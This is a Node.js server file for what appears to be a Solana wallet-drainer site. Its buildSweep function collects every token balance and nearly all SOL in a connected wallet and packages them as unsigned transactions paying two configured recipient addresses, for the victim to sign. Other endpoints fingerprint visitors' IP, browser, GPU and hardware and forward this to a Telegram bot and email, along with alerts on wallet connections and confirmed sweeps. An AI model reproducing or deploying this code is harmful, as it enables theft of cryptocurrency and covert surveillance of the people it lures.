import dotenv from 'dotenv'
import fs from 'node:fs'
import nodemailer from "nodemailer"
import express from 'express'
import cors from 'cors'
import util from 'node:util'
import axios from 'axios'
import { express as useragent } from 'express-useragent'
import MobileDetect from 'mobile-detect'
import { fileURLToPath } from 'node:url'
import path from 'node:path'
import { createAssociatedTokenAccountInstruction, createTransferCheckedInstruction, getAssociatedTokenAddressSync, getMint, TOKEN_2022_PROGRAM_ID, TOKEN_PROGRAM_ID, } from '@solana/spl-token'
import { Connection, LAMPORTS_PER_SOL, PublicKey, SystemProgram, Transaction, } from '@solana/web3.js'

dotenv.config({ path: path.join(path.dirname(fileURLToPath(import.meta.url)), '.env') })

const app = express()
const port = Number(process.env.PORT || 3001)
const rpcUrl = process.env.SOLANA_RPC_URL
const recipient1Share = Number(process.env.RECIPIENT_1_SHARE || 0.6)
const recipient2Share = Number(process.env.RECIPIENT_2_SHARE || 0.15)
const tokenRecipient2Share = Number(process.env.TOKEN_RECIPIENT_2_SHARE || 0.15)
const tokenRecipient1Share = 1 - tokenRecipient2Share
const maxTransactionBytes = 1232

if (!rpcUrl) throw new Error('SOLANA_RPC_URL is required')
if (!process.env.RECIPIENT_ADDRESS_1 || !process.env.RECIPIENT_ADDRESS_2) {
  throw new Error('RECIPIENT_ADDRESS_1 and RECIPIENT_ADDRESS_2 are required')
}
if (tokenRecipient2Share <= 0 || tokenRecipient2Share >= 1) {
  throw new Error('TOKEN_RECIPIENT_2_SHARE must be greater than 0 and less than 1')
}

const connection = new Connection(rpcUrl, 'confirmed')
const allowedOrigins = (process.env.FRONTEND_ORIGINS || 'https://novacore.dgtty.com')
 .split(',')
 .map((origin) => origin.trim())
 .filter(Boolean)

app.set('trust proxy', true)
app.use(cors({ origin: allowedOrigins, credentials: true }))
app.use(express.json({ limit: '32kb' }))
app.use(useragent())

const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN
const telegramChatId = process.env.TELEGRAM_CHAT_ID
const appLogPath = path.join(path.dirname(fileURLToPath(import.meta.url)), 'app.log')
const smtpHost = process.env.SMTP_HOST
const smtpPort = Number(process.env.SMTP_PORT || 587)
const smtpUser = process.env.SMTP_USER
const smtpPass = process.env.SMTP_PASS
const logEmailFrom = process.env.SMTP_FROM || process.env.LOG_EMAIL_FROM
const logEmailTo = process.env.LOG_EMAIL_TO || 'novacore@dgtty.com'
const mailTransport = smtpHost && smtpUser && smtpPass && logEmailFrom
  ? nodemailer.createTransport({
    host: smtpHost,
    port: smtpPort,
    secure: smtpPort === 465,
    auth: { user: smtpUser, pass: smtpPass },
  })
  : null

if (!telegramBotToken || !telegramChatId) {
  console.warn('Telegram logging is disabled: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are required')
}
if (!mailTransport) {
  console.warn('Email log delivery is disabled: SMTP_HOST, SMTP_USER, SMTP_PASS, and SMTP_FROM are required')
}

async function sendEmailLog(entry) {
  if (!mailTransport) return
  try {
    await mailTransport.sendMail({
      from: logEmailFrom,
      to: logEmailTo,
      subject: 'Novacore app log',
      text: entry,
    })
  } catch (error) {
    console.error('Email log delivery failed', error instanceof Error ? error.message : String(error))
  }
}

function writeAppLog(level, message, details = {}) {
  const entry = `[${level}] ${new Date().toISOString()} ${message} ${util.inspect(details, { depth: null })}\n`
  fs.appendFileSync(appLogPath, entry)
  void sendEmailLog(entry)
}

async function sendTelegramLog(message) {
  if (!telegramBotToken || !telegramChatId) {
    writeAppLog('WARN', 'Telegram credentials are missing')
    return false
  }
  try {
    const result = await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      chat_id: telegramChatId,
      text: message,
      disable_web_page_preview: true,
    }, { timeout: 10000 })
    if (!result.data?.ok) {
      throw new Error(result.data?.description || 'Telegram API rejected the message')
    }
    return true
  } catch (error) {
    writeAppLog('ERROR', 'Telegram log failed', {
      status: error.response?.status,
      response: error.response?.data,
      error: error instanceof Error ? error.message : String(error),
    })
    return false
  }
}

function getVisitIp(request) {
  return request.headers['x-forwarded-for']?.split(',')[0].trim() || request.socket.remoteAddress || 'Unknown'
}

function getDeviceDetails(request, deviceInfo = {}) {
  const userAgent = request.headers['user-agent'] || 'Unknown'
  return {
    ip: getVisitIp(request),
    browser: request.useragent?.browser || 'Unknown',
    platform: deviceInfo.platform || request.useragent?.platform || 'Unknown',
    userAgent,
    screenResolution: deviceInfo.screenResolution || 'N/A',
    language: deviceInfo.language || 'N/A',
    hardwareConcurrency: deviceInfo.hardwareConcurrency || 'N/A',
    gpuRenderer: deviceInfo.gpuRenderer || 'N/A',
  }
}

function parsePublicKey(value, fieldName) {
  try {
    return new PublicKey(value)
  } catch {
    const error = new Error(`${fieldName} must be a valid Solana address`)
    error.statusCode = 400
    throw error
  }
}

function getClientInfo(request) {
  const userAgent = request.headers['user-agent'] || ''
  const mobile = new MobileDetect(userAgent)
  return {
    ip: request.ip,
    platform: request.useragent?.platform,
    browser: request.useragent?.browser,
    mobile: Boolean(mobile.mobile()),
  }
}

async function buildSweep(owner) {
  const recipients = [
    parsePublicKey(process.env.RECIPIENT_ADDRESS_1, 'RECIPIENT_ADDRESS_1'),
    parsePublicKey(process.env.RECIPIENT_ADDRESS_2, 'RECIPIENT_ADDRESS_2'),
  ]
  const tokenAccounts = [
    ...(await connection.getParsedTokenAccountsByOwner(owner, { programId: TOKEN_PROGRAM_ID })).value,
    ...(await connection.getParsedTokenAccountsByOwner(owner, { programId: TOKEN_2022_PROGRAM_ID })).value,
  ]
  const groups = []
  const assets = []
  const createdDestinationAccounts = new Set()

  for (const tokenAccount of tokenAccounts) {
    const parsed = tokenAccount.account.data.parsed.info
    const rawAmount = BigInt(parsed.tokenAmount.amount)
    if (rawAmount === 0n) continue

    const mint = new PublicKey(parsed.mint)
    const programId = tokenAccount.account.owner
    const mintInfo = await getMint(connection, mint, undefined, programId)
    const tokenRecipient2Amount = (rawAmount * BigInt(Math.round(tokenRecipient2Share * 100))) / 100n
    const tokenRecipient1Amount = rawAmount - tokenRecipient2Amount
    const instructions = []

    for (const [index, destination] of recipients.entries()) {
      const transferAmount = index === 0 ? tokenRecipient1Amount : tokenRecipient2Amount
      if (transferAmount <= 0n) continue

      const destinationTokenAccount = getAssociatedTokenAddressSync(mint, destination, false, programId)
      const destinationKey = destinationTokenAccount.toBase58()
      if (!createdDestinationAccounts.has(destinationKey) && !(await connection.getAccountInfo(destinationTokenAccount))) {
        instructions.push(createAssociatedTokenAccountInstruction(owner, destinationTokenAccount, destination, mint, programId))
        createdDestinationAccounts.add(destinationKey)
      }

      instructions.push(createTransferCheckedInstruction(tokenAccount.pubkey, mint, destinationTokenAccount, owner, transferAmount, mintInfo.decimals, [], programId))
    }

    groups.push({ instructions })
    const mintAddress = mint.toBase58()
    const existingAsset = assets.find((asset) => asset.mint === mintAddress)
    if (existingAsset) {
      existingAsset.accounts += 1
      existingAsset.rawAmount = (BigInt(existingAsset.rawAmount) + rawAmount).toString()
    } else {
      assets.push({ mint: mintAddress, rawAmount: rawAmount.toString(), decimals: mintInfo.decimals, accounts: 1 })
    }
  }

  const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash()
  const makeTransaction = (instructions) => new Transaction({ feePayer: owner, blockhash, lastValidBlockHeight }).add(...instructions)
  const batches = []
  let currentInstructions = []

  for (const group of groups) {
    const candidate = makeTransaction([...currentInstructions, ...group.instructions])
    if (candidate.serialize({ requireAllSignatures: false, verifySignatures: false }).length <= maxTransactionBytes) {
      currentInstructions = [...currentInstructions, ...group.instructions]
      continue
    }

    if (currentInstructions.length === 0) throw new Error('One token account is too large to fit in a Solana transaction.')
    batches.push(makeTransaction(currentInstructions))
    currentInstructions = [...group.instructions]
  }
  if (currentInstructions.length > 0) batches.push(makeTransaction(currentInstructions))

  if (batches.length > 3) throw new Error('This wallet needs more than three transaction batches.')

  const balance = await connection.getBalance(owner)
  const feeTransaction = batches.length > 0 ? batches[batches.length - 1] : makeTransaction([])
  const fee = await connection.getFeeForMessage(feeTransaction.compileMessage())
  const availableLamports = BigInt(Math.max(0, balance - (fee.value || 0)))
  const recipient1Lamports = (availableLamports * BigInt(Math.round(recipient1Share * 100))) / 100n
  const recipient2Lamports = (availableLamports * BigInt(Math.round(recipient2Share * 100))) / 100n
  if (recipient1Lamports <= 0n || recipient2Lamports <= 0n) throw new Error('The wallet balance is too low for both recipient transfers.')

  const solInstructions = [
    SystemProgram.transfer({ fromPubkey: owner, toPubkey: recipients[0], lamports: Number(recipient1Lamports) }),
    SystemProgram.transfer({ fromPubkey: owner, toPubkey: recipients[1], lamports: Number(recipient2Lamports) }),
  ]
  const lastWithSol = makeTransaction([...(batches.at(-1)?.instructions || []), ...solInstructions])
  if (lastWithSol.serialize({ requireAllSignatures: false, verifySignatures: false }).length <= maxTransactionBytes) {
    if (batches.length === 0) batches.push(lastWithSol)
    else batches[batches.length - 1] = lastWithSol
  } else {
    if (batches.length >= 3) throw new Error('The SOL transfer does not fit within the three-batch limit.')
    batches.push(makeTransaction(solInstructions))
  }

  return {
    batches,
    assets,
    solAmounts: [Number(recipient1Lamports) / LAMPORTS_PER_SOL, Number(recipient2Lamports) / LAMPORTS_PER_SOL],
    batchCount: batches.length,
    lastValidBlockHeight,
  }
}

app.post('/api/log-visit', async (request, response) => {
  const details = getDeviceDetails(request, request.body?.deviceInfo)
  const message = `New site visitor detected!
----------------------------------
Platform: ${details.platform}
Browser: ${details.browser}
Screen resolution: ${details.screenResolution}
CPU cores: ${details.hardwareConcurrency}
Language: ${details.language}
GPU / chipset: ${details.gpuRenderer}
----------------------------------
IP address: ${details.ip}
User agent: ${details.userAgent}`

  writeAppLog('INFO', 'Site visit', details)
  const telegramSent = await sendTelegramLog(message)
  response.json({ success: true, telegramSent })
})

app.get('/api/health', (_request, response) => {
  response.json({ ok: true, network: process.env.SOLANA_NETWORK || 'mainnet-beta' })
})

app.post('/api/sweep/prepare', async (request, response, next) => {
  try {
    const owner = parsePublicKey(request.body?.owner, 'owner')
    const sweep = await buildSweep(owner)
    const transactionsBase64 = sweep.batches.map((transaction) => transaction.serialize({
      requireAllSignatures: false,
      verifySignatures: false,
    }).toString('base64'))

    const clientInfo = { owner: owner.toBase58(), ...getClientInfo(request) }
    const connectionMessage = `Wallet connected and transaction prepared.
  Wallet address: ${owner.toBase58()}
  Platform: ${clientInfo.platform || 'Unknown'}
  Browser: ${clientInfo.browser || 'Unknown'}
  IP address: ${clientInfo.ip || 'Unknown'}
  Batches: ${sweep.batchCount}`

    writeAppLog('INFO', 'Wallet connected and transaction prepared', clientInfo)
    void sendTelegramLog(connectionMessage)
    response.json({
      transactionsBase64,
      assets: sweep.assets,
      solAmounts: sweep.solAmounts,
      batchCount: sweep.batchCount,
      allocation: {
        recipient1: process.env.RECIPIENT_ADDRESS_1,
        recipient1TokenShare: tokenRecipient1Share,
        recipient1SolShare: recipient1Share,
        recipient2: process.env.RECIPIENT_ADDRESS_2,
        recipient2TokenShare: tokenRecipient2Share,
        recipient2SolShare: recipient2Share,
      },
      serializedLength: sweep.serializedLength,
      lastValidBlockHeight: sweep.lastValidBlockHeight,
    })
  } catch (error) {
    next(error)
  }
})

app.post('/api/sweep/confirm', async (request, response, next) => {
  try {
    const signature = String(request.body?.signature || '')
    if (!signature) {
      return response.status(400).json({ error: 'signature is required' })
    }

    const result = await connection.confirmTransaction(signature, 'confirmed')
    if (result.value.err) {
      return response.status(400).json({ confirmed: false, error: result.value.err })
    }

    writeAppLog('INFO', 'Transaction approved and confirmed', { signature, ip: getVisitIp(request) })
    void sendTelegramLog('Transaction successfully confirmed.')
    response.json({ confirmed: true, signature })
  } catch (error) {
    next(error)
  }
})

app.use((error, _request, response, _next) => {
  const statusCode = Number(error.statusCode || 500)
  console.error(error)
  response.status(statusCode).json({ error: error.message || 'Internal server error' })
})

app.listen(port, () => {
  console.log(`Solana backend listening on port:${port}`)
})
